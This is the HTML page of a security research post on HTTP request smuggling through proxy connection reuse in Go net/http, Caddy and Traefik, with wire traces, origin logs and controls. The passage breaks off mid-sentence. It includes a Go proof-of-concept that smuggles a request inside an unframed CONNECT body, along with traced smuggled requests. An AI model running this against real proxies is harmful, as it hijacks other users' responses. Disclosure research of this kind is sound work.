@@ -1,0 +1,862 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-chqq3b5l> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Smuggling Shouldn&#39;t Exist Anymore, Right? &mdash; xclow3n</title><meta name="description" content="A victim asked for /account and got the attacker's marker back, on a backend socket the proxy believed was clean. Ten products reuse a connection where the previous request is not finished, and reuse is not the defect. Turning it off takes the crossings to zero and leaves every defect in place. Four mechanisms, with wire traces, origin logs and a control for each."><meta name="robots" content="noindex"><meta name="theme-color" content="#0A0A0B"><meta name="author" content="Rajat Raghav"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap"><style>:root{--ground:#0A0A0B;--lift:#121214;--panel:#121216;--ink:#EDEAE3;--prose:#D6D2C9;--ink-2:#A6A29A;--dim:#8A857C;--faint:#827E76;--tick:#6E6A63;--rule:#2A2A2E;--rule-2:#3C3C42;--accent:#FFB000;--mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;--rail:76px;--rail-gap:28px;--gutter:40px;--measure:653px;--band:826px;color-scheme:dark}*,*:before,*:after{margin:0;padding:0;box-sizing:border-box}html{background:var(--ground);-webkit-text-size-adjust:100%;caret-color:var(--accent);scroll-behavior:smooth}@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}}body{background:var(--ground);color:var(--ink);font-family:var(--mono);font-variant-ligatures:none;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;overflow-x:hidden}ol,ul{list-style:none}a{color:inherit;text-decoration:none}::selection{background:var(--accent);color:var(--ground)}:root{scrollbar-color:#2F2F35 var(--ground);scrollbar-width:thin}::-webkit-scrollbar{width:11px;height:11px}::-webkit-scrollbar-track{background:var(--ground)}::-webkit-scrollbar-thumb{background:#2f2f35;border:3px solid var(--ground)}:focus-visible{outline:2px solid var(--accent);outline-offset:3px}.req{font-size:28px;font-weight:600;line-height:1.15;color:var(--faint);letter-spacing:-.01em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.req .host{color:var(--ink)}.req .verb{color:var(--dim)}.hdrs{display:grid;grid-template-columns:max-content minmax(0,1fr);column-gap:1ch;font-size:12.5px;line-height:1.6;color:var(--dim)}.hdrs dt{color:var(--faint)}.hdrs dd{color:var(--dim);min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.crlf{display:grid;grid-template-columns:var(--rail) minmax(0,1fr);column-gap:var(--rail-gap);align-items:center}.crlf b{font-size:10px;font-weight:400;letter-spacing:.08em;color:var(--tick);white-space:nowrap}.crlf i{display:block;height:1px;background:var(--rule-2)}.skip{position:absolute;left:-9999px;top:0;background:var(--accent);color:var(--ground);padding:10px 16px;font-size:13px;font-weight:600;z-index:9}.skip:focus{left:0}@media(max-width:1024px)and (min-width:721px){:root{--rail:58px;--rail-gap:20px;--gutter:32px}}@media(max-width:720px){:root{--rail:0px;--rail-gap:0px;--gutter:22px}.crlf{grid-template-columns:max-content minmax(0,1fr);column-gap:12px}.req{font-size:21px;white-space:normal;overflow:visible}.hdrs dd{white-space:normal;overflow:visible}}
+</style><link rel="stylesheet" href="/_astro/id-wire-article.DizQzE6i.css"></head> <body data-astro-cid-chqq3b5l> <a class="skip" href="#body" data-astro-cid-chqq3b5l>Skip to the article</a> <div class="shell" data-astro-cid-chqq3b5l> <header class="mast" data-astro-cid-chqq3b5l> <p class="req" data-astro-cid-chqq3b5l> <span class="verb" data-astro-cid-chqq3b5l>GET</span> <a href="/preview/id-wire" aria-label="Back to the index" data-astro-cid-chqq3b5l>http://<span class="host" data-astro-cid-chqq3b5l>xclow3n.com</span></a>/post/smuggling-shouldnt-exist-anymore/ HTTP/1.1
+</p> <dl class="hdrs" data-astro-cid-chqq3b5l> <dt data-astro-cid-chqq3b5l>X-Author:</dt> <dd data-astro-cid-chqq3b5l>Rajat Raghav &lt;me@xclow3n.com&gt;</dd> <dt data-astro-cid-chqq3b5l>X-Date:</dt> <dd data-astro-cid-chqq3b5l><time datetime="2026-10" data-astro-cid-chqq3b5l>October 2026</time></dd> <dt data-astro-cid-chqq3b5l>X-Length:</dt> <dd data-astro-cid-chqq3b5l>32 min read</dd>  <dt data-astro-cid-chqq3b5l>X-Credit:</dt> <dd class="cred" data-astro-cid-chqq3b5l>CVE-2026-56866</dd>  </dl> <!-- the empty line that ends a head; the article begins below it --> <div class="crlf" data-astro-cid-chqq3b5l><b aria-hidden="true" data-astro-cid-chqq3b5l>0d0a 0d0a</b><i data-astro-cid-chqq3b5l></i></div> </header> <main class="doc" id="body" data-astro-cid-chqq3b5l> <h1 class="hed" data-astro-cid-chqq3b5l>Smuggling Shouldn&#39;t Exist Anymore, Right?</h1> <p class="deck" data-astro-cid-chqq3b5l>A victim asked for /account and got the attacker&#39;s marker back, on a backend socket the proxy believed was clean. Ten products reuse a connection where the previous request is not finished, and reuse is not the defect. Turning it off takes the crossings to zero and leaves every defect in place. Four mechanisms, with wire traces, origin logs and a control for each.</p> <div class="wire-body" data-astro-cid-chqq3b5l><h2 id="tldr">TL;DR</h2>
+<p>Connection reuse is a trust decision, and these ten products make it on a
+connection where the previous request is not finished: a body written with no
+delimiter, a body received and never read, framing taken from the inbound
+request rather than the bytes being forwarded, a parser reset over bytes still
+in the buffer. Reuse is what turns that into someone else’s problem rather
+than a later request of your own, and it is not itself the defect. Turning it
+off takes the crossings to zero in all four families and leaves the defect
+where it was: Envoy still wrote the DATA, HAProxy still announced the wrong
+length, Jetty still forwarded the surplus and the origin still parsed it. It
+is not the same switch in each product, and it contains the damage rather than
+removing the bug.</p>
+<p>Four mechanisms, each with a worked case, wire traces and a control.</p>
+<p><strong><a href="#1-pre-grant-write">Pre-grant write</a></strong> writes the body for a tunnel or a
+protocol switch with no delimiter, before the peer has agreed to either, and a
+refusal leaves it in the request stream.
+Go <code>net/http</code> · Traefik · Caddy · Envoy · nghttpx</p>
+<p><strong><a href="#2-unproven-drain-reuse">Unproven-drain reuse</a></strong> keeps a connection in
+service on a check that reports a drain it never performed.
+Go <code>net/http</code> again, its server half, measured in a shipped binary as
+Prometheus Pushgateway</p>
+<p><strong><a href="#3-promise-credited-framing">Promise-credited framing</a></strong> takes the framing
+it prints from the request it received instead of from the bytes it forwards.
+HAProxy · Jetty · APISIX</p>
+<p><strong><a href="#4-reset-with-debt">Reset-with-debt</a></strong> clears parser state while the
+connection still holds the previous request’s bytes.
+Netty · Elasticsearch</p>
+<p>Most software gets this right. Of the 19 backend configurations I measured, 18
+were clean. <a href="#what-did-not-reproduce">What did not reproduce</a> has the numbers
+and the one exception.</p>
+<p>This is independent research I did through 2026. Further findings in these
+families are under coordinated disclosure and are not in this post.</p>
+<details open class="ev-aside">
+<summary>New to this? Six things the rest of the post assumes. Skip if you know them.</summary>
+<p><strong>1. Connections are reused, and proxies share them between strangers.</strong>
+Opening a TCP connection is expensive, so nothing opens one per request. A
+proxy keeps a <em>pool</em> of open connections to the server behind it, called the
+origin, and hands them out as requests arrive. The connection that carried
+your request a moment ago will carry someone else’s next. That sharing is the
+whole attack surface in this post: if a connection is handed over in a bad
+state, the person who gets it next is a stranger.</p>
+<p><strong>2. Both ends have to agree where each message ends.</strong> Requests arrive back
+to back on one connection, so a receiver needs to know where to stop reading.
+There are two ways to tell it. <code>Content-Length: 57</code> means read exactly 57 more
+bytes. Chunked encoding instead sends the body in pieces, each one introduced
+by its size in hexadecimal, with a zero-sized chunk marking the end:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>17                     &#x3C;- the next chunk is 0x17 = 23 bytes</span></span>
+<span class="line"><span>Hello, this is 23 bytes</span></span>
+<span class="line"><span>0                      &#x3C;- zero chunk: the body is over</span></span>
+<span class="line"><span></span></span></code></pre>
+<p><strong>3. Smuggling is what happens when the two ends disagree about that
+boundary.</strong> The connection is then <em>desynchronised</em>, usually shortened to
+desync: the two ends no longer agree about where they are in the byte stream.
+If a proxy thinks a request ended at byte 57 and the server thinks
+it ended at byte 12, the 45 bytes in between are still sitting in the server’s
+buffer. The server reads them as the beginning of the next request. An
+attacker who controls those bytes has just placed a request on the connection
+that the proxy never saw and never checked. Then two things follow: the server
+owes a response nobody asked for, so whoever gets that connection next
+receives it, and the smuggled request is waiting to be completed by the next
+person’s bytes, which can include their session cookie.</p>
+<p><strong>4. Some requests ask to change what the connection means.</strong> <code>CONNECT</code> asks a
+proxy to stop being a proxy and become a plain tunnel; an <code>Upgrade</code> request
+asks to switch protocol, to WebSocket for example. Both are <em>requests</em>, not
+commands. The other end grants a CONNECT by answering <code>2xx</code> and an upgrade by
+answering <code>101</code>, and only after that does the connection stop being ordinary
+HTTP. A refusal leaves it exactly as it was, still parsing requests. In HTTP/2
+and HTTP/3 a body travels in DATA frames, and the method, scheme and path
+travel as pseudo-headers written with a leading colon. The <code>101</code> above is the HTTP/1 form. An upgrade in those
+versions is an <em>extended CONNECT</em>, granted by a <code>2xx</code> on the stream rather
+than by a <code>101</code>, which carries in <code>:protocol</code> the token
+HTTP/1 would put in <code>Upgrade</code>.</p>
+<p><strong>5. This post is about a different disagreement from the usual one.</strong> That
+kind comes from the two ends <em>parsing</em> differently, one honouring
+<code>Content-Length</code> and the other <code>Transfer-Encoding</code>. In the bugs
+here, nobody parses anything incorrectly. Every party reads the bytes exactly
+right. The disagreement is about whether the exchange is <strong>finished</strong>, and the
+damage is done when one side returns a connection to the pool while bytes
+belonging to the last user are still unaccounted for.</p>
+<p><strong>6. Two words the measurements are written in.</strong> A <em>crossing</em> is one measured
+instance of the above: one request that read bytes belonging to somebody
+else’s. A <em>control</em> is the same test run again with one thing changed that
+ought to stop it, like turning connection reuse off. Controls are there
+because a test that never fails is not measuring anything, so each one is
+reported with its own count. Figures are written <code>n of m</code>: <code>m</code> is how many
+trials or victims that arm had, and <code>n</code> is how many showed the thing just
+named, which in a control is usually the thing <em>not</em> happening.</p>
+</details>
+<h2 id="the-result-first">The result first</h2>
+<p>A victim in its own container, on its own QUIC connection, asked for
+<code>/account</code>. It got <code>200 OK</code> and this body:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ATTACKER_XCONTAINER_MARKER_q7w8e9_SLOW</span></span></code></pre>
+<p>The proxy in front of it had decided, correctly by its own accounting, that the
+backend socket it leased to that victim was clean. It was not. It was carrying
+the answer to 88 bytes of someone else’s request, which the origin had parsed
+and was still answering.</p>
+<h2 id="the-question-each-component-got-wrong">The question each component got wrong</h2>
+<p>I read connection-reuse code in HTTP proxies, servers and client libraries,
+looking for one thing: what each component accepts as proof that an exchange
+has finished and the socket may serve someone else.</p>
+<p>The method was source-first rather than black-box. Find the predicate that
+authorises reuse, work out what it can and cannot observe, then build a lab
+that makes it wrong and see whether a second client can be made to read the
+first one’s bytes.</p>
+<p><strong>Which of four places holds the mistake turned out to be a better way to group
+these findings than either the product or the protocol version.</strong> Four
+components decide something about the end of a message, and each can be wrong
+on its own:</p>
+<div class="t-scroll" tabindex="0">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Component</th><th>Decides</th><th>Goes wrong by</th></tr></thead><tbody><tr><td><strong>Write scheduler</strong></td><td>when bytes are allowed onto the wire</td><td>sending them under a meaning the other end has not agreed to yet, so they arrive as something it was not expecting</td></tr><tr><td><strong>Reuse predicate</strong></td><td>whether a connection may be handed to a new user</td><td>answering with something that cannot see whether the last exchange finished, so the next person inherits the leftovers</td></tr><tr><td><strong>Serializer</strong></td><td>what framing to print in front of a body</td><td>taking it from the request it received rather than the bytes in hand, so the backend looks for the end of the body in the wrong place</td></tr><tr><td><strong>Parser state machine</strong></td><td>how much of the message is still outstanding</td><td>resetting on an error without discarding what was already read, so the next parse starts mid-request</td></tr></tbody></table></div>
+<p>Each gets a section below: the clearest case worked all the way to the wire,
+and the rest folded underneath it.</p>
+<p>Protocol version is not one of these, which surprised me. HTTP/1 ends a
+message by counting, by a zero chunk, or by closing the connection, and the
+counting case is the one here: the headers promise a length and the receiver
+reads that many bytes. HTTP/2 and HTTP/3 add a per-request end-of-stream signal
+HTTP/1 never had: an <code>END_STREAM</code> flag in HTTP/2, and in HTTP/3 the end of the
+QUIC stream itself.</p>
+<p>That signal is a convenience and it is also the trap. A component can believe
+it on its own and skip the counting, and it only describes what the client
+stopped sending. It says nothing about what a backend further down the chain
+did with the bytes already forwarded to it. So the newer protocols are where a
+premature “we’re done” signal comes from, and any of the four places above can
+act on one without checking.</p>
+<h2 id="1-pre-grant-write">1. Pre-grant write</h2>
+<p>Bytes emitted under a meaning the peer has not granted yet, with no delimiter,
+because the component expects the grant to come. A CONNECT payload written
+before the 2xx, or upgrade data written before the 101, creates the debt before
+any reuse decision is reached, and a refusal is what leaves it in the request
+stream. The debt is the bytes themselves: written onto the connection, and
+accounted for by neither end.</p><figure class="dgm"><svg viewBox="0 0 440 292" role="img" aria-label="One byte stream on one socket, framed as a single request in the box above it and as two separate requests in the two boxes below it, the division falling at sequence 403."><text x="30" y="16" class="dgm__s">the attacker's own request, to Caddy</text><rect x="30" y="22" width="380" height="38" class="dgm__bxa"></rect><text x="220" y="38" class="dgm__sa dgm__mid">one HTTP/3 CONNECT with early DATA</text><text x="220" y="52" class="dgm__sa dgm__mid">no :scheme, no :path, 88-byte payload</text><g class="dgm__a"><line x1="220" y1="62" x2="220" y2="74" class="dgm__ln"></line><polygon points="220,80 216.5,73 223.5,73" class="dgm__hd"></polygon></g><text x="230" y="76" class="dgm__s">Caddy writes it to Apache</text><text x="220" y="92" class="dgm__s dgm__mid">the body went out before any grant</text><rect x="30" y="98" width="380" height="22" class="dgm__bxo"></rect><text x="220" y="113" class="dgm__s dgm__mid">Caddy: one request, no delimiter</text><rect x="30" y="128" width="268.9" height="34" class="dgm__bxp"></rect><text x="164.45" y="143" class="dgm__s dgm__mid">CONNECT header block</text><text x="164.45" y="156" class="dgm__s dgm__mid">seq 190:403, len 213</text><rect x="298.9" y="128" width="111.10000000000002" height="34" class="dgm__bxa"></rect><text x="354.45" y="143" class="dgm__sa dgm__mid">88 bytes</text><text x="354.45" y="156" class="dgm__sa dgm__mid">seq 403:491</text><rect x="30" y="170" width="262.9" height="22" class="dgm__bxo"></rect><text x="161.45" y="185" class="dgm__s dgm__mid">answered 405, still parsing</text><rect x="304.9" y="170" width="105.10000000000002" height="22" class="dgm__bxo"></rect><text x="357.45" y="185" class="dgm__s dgm__mid">answered 200</text><text x="220" y="206" class="dgm__s dgm__mid">Apache: two requests</text><line x1="298.9" y1="122" x2="298.9" y2="198" class="dgm__div"></line><line x1="30" y1="220" x2="410" y2="220" class="dgm__hr"></line><text x="30" y="236" class="dgm__s">the socket is pooled, and then</text><g class="dgm__a dgm__a--vic"><line x1="30" y1="250" x2="104" y2="250" class="dgm__ln"></line><polygon points="110,250 103,246.5 103,253.5" class="dgm__hd"></polygon></g><text x="120" y="254" class="dgm__lv">the victim's GET /account, out</text><g class="dgm__a dgm__a--att"><line x1="110" y1="276" x2="36" y2="276" class="dgm__ln"></line><polygon points="30,276 37,272.5 37,279.5" class="dgm__hd"></polygon></g><text x="120" y="280" class="dgm__la">the answer to the 88 bytes, back</text></svg><figcaption class="dgm__cap" id="dgm-pre-grant-write">The attacker sends their own CONNECT, and the 88 bytes of its body go out before any grant and with no delimiter. Caddy frames that socket as one request and records nothing about it. Apache, having refused with 405 and kept the connection parsing, frames it as two. The boundary at sequence 403 exists for Apache and not for Caddy.</figcaption></figure>
+<p>The clearest case is <code>CVE-2026-56866</code> in Go’s <code>net/http</code>. For a CONNECT
+request, <code>Transport</code> writes the body immediately after the header block, with
+no chunked encoding, no <code>Content-Length</code> and no delimiter of any kind, and it
+does this before the backend has said anything at all.</p>
+<p>Caddy inherits this. It reverse-proxies through <code>net/http</code>, so the write above
+is the one its own backend connections make, and the trace below is that
+defect seen through a shipped proxy rather than a second one.</p>
+<p>The attacker sends a plain HTTP/3 CONNECT with early DATA, no <code>:scheme</code> and no
+<code>:path</code>, whose 88-byte payload is a complete HTTP/1 request. Below is one TCP
+socket between Caddy and Apache, with byte offsets on that socket and <code>in</code>
+marking the backend’s replies:</p>
+<figure class="trc" aria-labelledby="trc-pre-grant-socket"><figcaption class="trc__cap" id="trc-pre-grant-socket"><span class="trc__capg" aria-hidden="true">▌</span>The same socket, marked by who wrote each segment</figcaption><div class="trc__stream trc__stream--rail"><div class="trc__rail" aria-hidden="true"><span class="trc__band trc__band--prx" style="--f:0;--n:2">PRX</span><span class="trc__band trc__band--att" style="--f:3;--n:2">ATT</span><span class="trc__band trc__band--org" style="--f:6;--n:2">ORG</span><span class="trc__band trc__band--prx" style="--f:9;--n:1">PRX</span><span class="trc__band trc__band--org" style="--f:11;--n:2">ORG</span></div><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>seq 190:403   len 213   CONNECT caddy.local:80 HTTP/1.1</span></span>
+<span class="line"><span>                        Via: 3.0 Caddy</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>seq 403:491   len  88   <mark class="trc__by">GET /slow-marker HTTP/1.1</mark></span></span>
+<span class="line"><span>                        <mark class="trc__by">X-Smuggle-Attacker: crosscontainer-att</mark></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>              in        HTTP/1.1 405 Method Not Allowed</span></span>
+<span class="line"><span>                        Content-Length: 264</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>seq 491:688   len 197   <mark class="trc__vic">GET /account HTTP/1.1</mark>          &#x3C;- the victim</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>              in        HTTP/1.1 200 OK</span></span>
+<span class="line"><span>                        <mark class="trc__by">ATTACKER_XCONTAINER_MARKER_q7w8e9_SLOW</mark></span></span></code></pre></div><p class="trc__key"><span class="trc__ki"><b class="trc__kt">PRX</b> written and routed by the proxy</span><span class="trc__ki"><b class="trc__kt">ATT</b> the attacker's body, written unframed and never routed</span><span class="trc__ki"><b class="trc__kt">ORG</b> the origin answering</span><span class="trc__ki"><b class="trc__by">attacker</b> bytes that originated with the attacker</span><span class="trc__ki"><b class="trc__vic">victim</b> bytes that originated with the victim</span></p></figure>
+<p>The smuggled request line starts at sequence 403, in its own segment,
+immediately after the CONNECT header block, with no chunk size in front of it
+and no <code>Content-Length</code> describing it.</p>
+<p>The <code>405</code> is what makes this work. Had Apache granted the CONNECT, it would
+have stopped reading those bytes as HTTP at all and started shovelling them
+down a tunnel, which is the whole point of a tunnel. It refused instead. A
+refusal leaves the connection exactly where it was, still parsing requests,
+and the proof is in the response itself: Apache’s <code>405</code> carries
+<code>Content-Length: 264</code> and keeps the connection alive, which no tunnel would.
+So it refused a method, and then read the next 88 bytes as what they look
+like.</p>
+<p>Nothing in the transport records that the socket is dirty, because nothing in
+the transport is tracking what the backend did with those bytes. The write
+happened. That is all it knows.</p>
+<details class="ev-aside">
+<summary>Apache logged a request the proxy never routed. The controls, and why only CONNECT.</summary>
+<p>This is Apache’s own log from the run above, the side of it Caddy never sees.
+One source port, one Apache child, and the keep-alive counter climbing through
+all five requests:</p>
+<figure class="trc" aria-labelledby="trc-apache-one-socket"><figcaption class="trc__cap" id="trc-apache-one-socket"><span class="trc__capg" aria-hidden="true">▌</span>The origin's log for that socket, with the two parties' request lines marked</figcaption><div class="trc__stream"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>src=172.18.0.3:47156 pid=10 kacount=0 kastatus=+ status=200 reqline="GET / HTTP/1.1"</span></span>
+<span class="line"><span>src=172.18.0.3:47156 pid=10 kacount=1 kastatus=+ status=200 reqline="GET / HTTP/1.1"</span></span>
+<span class="line"><span>src=172.18.0.3:47156 pid=10 kacount=2 kastatus=+ status=405 reqline="<mark class="trc__by">CONNECT caddy.local:80 HTTP/1.1</mark>"</span></span>
+<span class="line"><span>src=172.18.0.3:47156 pid=10 kacount=3 kastatus=+ status=200 reqline="<mark class="trc__by">GET /slow-marker HTTP/1.1</mark>"</span></span>
+<span class="line"><span>src=172.18.0.3:47156 pid=10 kacount=4 kastatus=+ status=200 reqline="<mark class="trc__vic">GET /account HTTP/1.1</mark>"</span></span></code></pre></div><p class="trc__key"><span class="trc__ki"><b class="trc__by">attacker</b> bytes that originated with the attacker</span><span class="trc__ki"><b class="trc__vic">victim</b> bytes that originated with the victim</span></p></figure>
+<p><code>kacount=3</code> is a request the proxy never routed and no client ever sent.
+<code>kacount=4</code> is the victim, one behind it on the same socket.</p>
+<p>The same run with <code>KeepAlive Off</code> gives four distinct source ports,
+<code>kacount=0</code> on every line, and no smuggled request line at all. The victim got
+<code>VICTIM_OWN_ACCOUNT_BODY_v1c2t9</code>.</p>
+<p>One more control separates the write from the handover. Against a backend that
+<em>does</em> read the CONNECT body, draining it until the socket goes idle and
+consuming all 88 bytes, <code>want=88 got=88</code> in 10 of 10, the socket was still
+pooled, still handed to the victim, and the victim still read its own answer,
+10 of 10. The same backend with the drain switched off crosses 10 of 10, and so
+does one that holds its <code>405</code> back by the drain’s own 300 ms, so neither the
+backend nor the added delay is what removed the crossing. Reuse on its own is
+harmless. The unframed, unconsumed body is the defect.</p>
+<p>That backend had to be written for the control. An unframed body has no length,
+so reading it to idle is the only way to consume one, and no general-purpose
+server offers that.</p>
+<p><strong>Why only CONNECT.</strong> The same body under three methods, with
+<code>ContentLength: -1</code>, 10 trials each:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>CONNECT 127.0.0.1:41453 HTTP/1.1          POST /p HTTP/1.1</span></span>
+<span class="line"><span>Accept-Encoding: gzip                     Transfer-Encoding: chunked</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>GET /smuggled HTTP/1.1                    23</span></span>
+<span class="line"><span>Host: x                                   GET /smuggled HTTP/1.1</span></span>
+<span class="line"><span>                                          Host: x</span></span>
+<span class="line"><span>no Transfer-Encoding</span></span>
+<span class="line"><span>no Content-Length                         0</span></span>
+<span class="line"><span>0 of 10 trials framed it</span></span></code></pre>
+<p><code>POST</code> and an <code>Upgrade</code> GET both come out chunked, beginning with a chunk-size
+line rather than a method token, so neither can be read as a request. The
+Upgrade GET splits across two chunks, <code>1</code> and <code>0x22</code>, because GET is usually
+bodyless and <code>probeRequestBody</code> steals one byte to test for emptiness
+(<code>transfer.go:216</code>).</p>
+<p>CONNECT is excluded from framing deliberately.
+<code>shouldSendChunkedRequestBody</code> returns false for it at <code>transfer.go:184</code>, and
+<code>writeBody</code> copies an unframed body straight through at <code>transfer.go:373-378</code>.
+Line numbers are go1.27.1. The exclusion is right for a tunnel that was
+granted. It is applied before anyone has granted it.</p>
+<p><strong>Reproducing it without a proxy.</strong> One <code>http.Transport</code>, two requests, a
+backend that answers CONNECT with a keep-alive non-2xx:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="go"><code><span class="line"><span style="color:#E6EDF3">tr </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">http</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Transport</span><span style="color:#E6EDF3">{MaxIdleConns: </span><span style="color:#79C0FF">100</span><span style="color:#E6EDF3">, MaxIdleConnsPerHost: </span><span style="color:#79C0FF">100</span><span style="color:#E6EDF3">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">payload </span><span style="color:#FF7B72">:=</span><span style="color:#A5D6FF"> "GET /slow-marker?d=2.0 HTTP/1.1</span><span style="color:#FF7B72">\r\n</span><span style="color:#A5D6FF">Host: "</span><span style="color:#FF7B72"> +</span><span style="color:#E6EDF3"> addr </span><span style="color:#FF7B72">+</span></span>
+<span class="line"><span style="color:#A5D6FF">           "</span><span style="color:#FF7B72">\r\n</span><span style="color:#A5D6FF">X-Smuggled: 1</span><span style="color:#FF7B72">\r\n\r\n</span><span style="color:#A5D6FF">"</span></span>
+<span class="line"><span style="color:#E6EDF3">att </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">http</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Request</span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#E6EDF3">    Method: </span><span style="color:#A5D6FF">"CONNECT"</span><span style="color:#E6EDF3">, URL: </span><span style="color:#FF7B72">&#x26;</span><span style="color:#FFA657">url</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">URL</span><span style="color:#E6EDF3">{Scheme: </span><span style="color:#A5D6FF">"http"</span><span style="color:#E6EDF3">, Host: addr}, Host: addr,</span></span>
+<span class="line"><span style="color:#E6EDF3">    Header: </span><span style="color:#D2A8FF">make</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">http</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Header</span><span style="color:#E6EDF3">),</span></span>
+<span class="line"><span style="color:#E6EDF3">    Body:   io.</span><span style="color:#D2A8FF">NopCloser</span><span style="color:#E6EDF3">(strings.</span><span style="color:#D2A8FF">NewReader</span><span style="color:#E6EDF3">(payload)),</span></span>
+<span class="line"><span style="color:#E6EDF3">    ContentLength: </span><span style="color:#FF7B72">-</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span>
+<span class="line"><span style="color:#E6EDF3">tr.</span><span style="color:#D2A8FF">RoundTrip</span><span style="color:#E6EDF3">(att)                 </span><span style="color:#8B949E">// 405, socket returns to the idle pool</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">time.</span><span style="color:#D2A8FF">Sleep</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">500</span><span style="color:#FF7B72"> *</span><span style="color:#E6EDF3"> time.Millisecond)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">vic, _ </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> http.</span><span style="color:#D2A8FF">NewRequest</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"GET"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"http://"</span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3">addr</span><span style="color:#FF7B72">+</span><span style="color:#A5D6FF">"/account"</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">nil</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">tr.</span><span style="color:#D2A8FF">RoundTrip</span><span style="color:#E6EDF3">(vic)                 </span><span style="color:#8B949E">// reads the attacker's queued response</span></span></code></pre>
+<p>Against Apache 2.4.69 that crossed 25 of 25.</p>
+<p>A declared <code>Content-Length</code> is not a defence, although one value looks like it.
+Apache consumes exactly as many body bytes as the CONNECT declares, then parses
+whatever follows. Declare the exact length of the smuggled request and the
+arithmetic swallows all of it: 0 of 25. <code>Content-Length: 0</code> crosses 25 of 25.
+A <code>Content-Length: 10</code> over ten bytes of filler crosses 25 of 25.
+<code>Transfer-Encoding: chunked</code> with a terminating zero chunk crosses 25 of 25.
+In the real path neither proxy declares anything: captured inside Apache’s own
+network namespace during a crossing, both Caddy and <code>httputil.ReverseProxy</code>
+write the CONNECT header block with no <code>Content-Length</code> and no
+<code>Transfer-Encoding</code>.</p>
+<p>The smuggled endpoint also has to be slow. Against a fast one the smuggled
+response is produced before the victim arrives, lands on a connection still
+idle in the pool, and <code>readLoopPeekFailLocked</code> logs it and closes the socket
+(<code>transport.go:2640</code> and <code>transport.go:2647</code>): 0 of 10. Against a two-second endpoint, 10 of 10.</p>
+</details>
+<details>
+<summary>Three more products: Traefik CVE-2026-71324, Envoy CVE-2026-73548, nghttpx, and why Caddy's report was dismissed</summary>
+<p><strong>Traefik <code>CVE-2026-71324</code></strong> inherits this through <code>net/http</code>. The write-up is
+at <a href="https://i0.rs/blog/http-2-connect-smuggling-into-traefik-s-connection-pool/">i0.rs</a>,
+with the scenario matrix and the <code>serversTransport</code> workarounds. What is below
+is the measurement rather than the account of it.</p>
+<p>At v3.6.23 its proxy path is the <code>Director</code> form, forces
+<code>outReq.Proto = "HTTP/1.1"</code> at <code>pkg/proxy/httputil/proxy.go:65-66</code>, and
+contains no <code>MethodConnect</code> branch anywhere in the file.</p>
+<p>64 victim connections per build, 8 victims in each of 8 trials, Traefik
+restarted between trials, correlated by a per-request tag the backend echoes.
+v3.6.23: 64 of 64 wrong, 8 trials of 8. v3.6.24: 0 of 64, every victim
+receiving its own tagged body, so that zero is not a dead instrument. On the
+3.7 line I ran one cascade rather than eight: v3.7.9 gave 0 of 8, and
+<code>pkg/proxy/httputil/connect.go</code> is absent at v3.7.8 and present at v3.7.9,
+which is the same boundary the 3.6 line shows.</p>
+<p>Per trial, victim 1 reads the attacker’s body and victims 2 through 8 each read
+their predecessor’s. Over 64 connections that is 8 carrying the attacker’s own
+marker and 56 carrying another user’s. The connection crossed for all 64; only
+8 got the attacker specifically.</p>
+<p>It is not a pool-size artefact. With the stock dynamic configuration and no
+<code>serversTransport</code> block at all it still crossed 64 of 64. It does depend on
+the victims’ own responses being slow: against an instant endpoint exactly one
